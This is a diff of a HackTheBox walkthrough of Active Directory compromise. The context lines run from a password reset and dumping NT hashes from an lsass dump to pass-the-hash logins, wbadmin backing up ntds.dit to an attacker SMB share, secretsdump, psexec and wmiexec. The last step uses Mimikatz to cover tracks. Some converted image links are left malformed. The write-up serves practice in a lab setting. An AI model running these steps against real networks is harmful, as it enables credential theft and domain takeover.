@@ -265,7 +265,7 @@ Set the password with
 
 `setuserinfo2 Audit2020 23 'PleaseSub'`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109205719.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109205719.png)
 It failed tho because password was not complex enough.
 
 ```
@@ -278,7 +278,7 @@ Test it out with #crackmapexec
 cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!'
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109205908.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109205908.png)
 
 Check shares and we can read the forensic / audit share now. 
 
@@ -286,7 +286,7 @@ Check shares and we can read the forensic / audit share now.
 cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!' --shares
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109210028.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109210028.png)
 
 Ensure stuff is unmounted with
 
@@ -298,7 +298,7 @@ sudo umount /mnt
 sudo mount -t cifs -o 'username=audit2020,password=PleaseSub!' //10.10.10.192/forensic /mnt
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109210237.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109210237.png)
 ```
 cd /mnt
 ```
@@ -307,7 +307,7 @@ cd /mnt
 ls -la
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109210308.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109210308.png)
 Look through these directories
 
 `cd memory_analysis`
@@ -316,7 +316,7 @@ Look through these directories
 
 `lsass.zip` file is interesting. 
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250109210517.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109210517.png)
 lsass is where mimikatz pulls plaintext passwords. 
 
 Search for the lsass dump tool [[pypykatz]]
@@ -337,27 +337,27 @@ Finding flags to use with pypykatz and lsa
 pypykatz lsa -h
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110190623.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110190623.png)
 Running `pypykatz lsa minidump lsass.DMP > lsass.out`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110190750.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110190750.png)
 
 `less lsass.out` to go through it. 
 
 Find `svc_backup` user and an NT hash.
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191140.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110191140.png)
 Grab all the NT hashes with `grep NT lsass.out -B3 | grep -i username `
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191315.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110191315.png)
 Grab NT hashes for `svc_backup` and `administrator` and pop into credentials file. 
 
-![[Pasted image 20250110191447.png]]
+![](Pasted%20image%2020250110191447.png)
 Try #crackmapexec with administrator's NT hash. 
 
 `cme smb 10.10.10.192 -u administrator -H 7fle4ff8c6a8e6b6fcae2d9c0572cd62 `
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191643.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110191643.png)
 
 It fails. 
 
@@ -367,7 +367,7 @@ Trying other user
 cme smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191756.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110191756.png)
 
 This works but no pwn3d.
 
@@ -377,13 +377,13 @@ Use #evilwinrm to login.
 evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110191933.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110191933.png)
 
 Running `whoami /all` and discover we have some dangerous privileges:
 
 `SeBackupPrivilege` and `SeRestorePrivilege`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110200246.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110200246.png)
 SeBackupPrivilege:
 
 * Save things out of the registry
@@ -391,14 +391,14 @@ SeBackupPrivilege:
 * Restore files 
 * Members of "Backup Operators" can logon locally on DC & backup ntds.dit ex. with "wbadmin.exe" or "diskshadow.exe"
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110200617.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110200617.png)
 Use #impacket #smbserver to set up a share on attacker box.
 
 ```
 sudo smbserver.py -smb2support -user ippsec -password PleaseSubscribe SendMeYoData $ (pwd)
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201022.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110201022.png)
 
 Access this local share from remote win-rm shell 
 
@@ -406,7 +406,7 @@ Access this local share from remote win-rm shell
 net use x: \\10.10.14.2\SendMeYoData /user: ippsec PleaseSubscribe
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201148.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110201148.png)
 
 Now get wbadmin to send the ntds backup file to our impacket share. 
 
@@ -414,22 +414,22 @@ Now get wbadmin to send the ntds backup file to our impacket share.
 wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201423.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110201423.png)
 If there's a logon prompt for [Y] or [N] can echo y into prompt like 
 
 ```
 echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201724.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110201724.png)
 This fails because it wants an NTFS folder. 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110201821.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110201821.png)
 Create an NTFS folder:
 
 ```
 dd if=/dev/zero of=ntfs.disk bs=1024M count=2
 ```
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110202001.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110202001.png)
 
 ```
 sudo losetup -fP ntfs.disk
@@ -441,13 +441,13 @@ Check mount with
 losetup -a
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110202212.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110202212.png)
 
 ```
 sudo mkfs.ntfs /dev/loop0
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110202259.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110202259.png)
 
 ```
 sudo mount /dev/loop0 smb/
@@ -457,7 +457,7 @@ sudo mount /dev/loop0 smb/
 mount | grep smb
 ```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110202412.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110202412.png)
 
 Re-running impacket command. 
 
@@ -476,19 +476,21 @@ This fails again because impacket doesn't handle ntfs well.
 Editing samba to create a windows fileshare from linux
 
 `vi /etc/samba/smb.conf`
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203054.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110203054.png)
 
 Restart smbd
 
 `sudo systemctl restart smbd`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203411.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110203411.png)
 
 From evil-winrm, mount to the share
 
-`net use x: \\10.10.14.2\SendMeYoData`
+```
+net use x: \\10.10.14.2\SendMeYoData
+```
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110203304.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250110203304.png)
 
 Now trying the wbadmin command AGAIN
 
@@ -528,24 +530,24 @@ Save and download the reg keys
 
 `download system.hive`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204640.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110204640.png]]
 Now we can run #impacket #secretsdump 
 
 (without history)
 `secretsdump.py -ntds ntds.dit -system system.hive LOCAL`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205058.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205058.png]]
 
 
 (with history)
 `secretsdump.py -ntds ntds.dit -system system.hive -history LOCAL`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205137.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205137.png]]
 We got admin's hash so can use #psexec with this hash.
 
 `psexec.py -hashes 184fb5e5178480be64824H4cd53b99ee:184fb5e5178480be64824H4cd53b99ee administrator@10.10.10.192`
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205419.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205419.png]]
 
 Can't grab the flag as SYSTEM user due to EFS (Encrypted File System). Using WMIExec to get a shell as the actual user
 
@@ -557,4 +559,4 @@ wmiexec.py -hashes 184fb5e5178480be64824H4cd53b99ee:184fb5e5178480be64824H4cd53b
 
 Using Mimikatz to restore the password of Audit2020, so it's like we were never there.
 
-![[https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205816.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted image 20250110205816.png]]
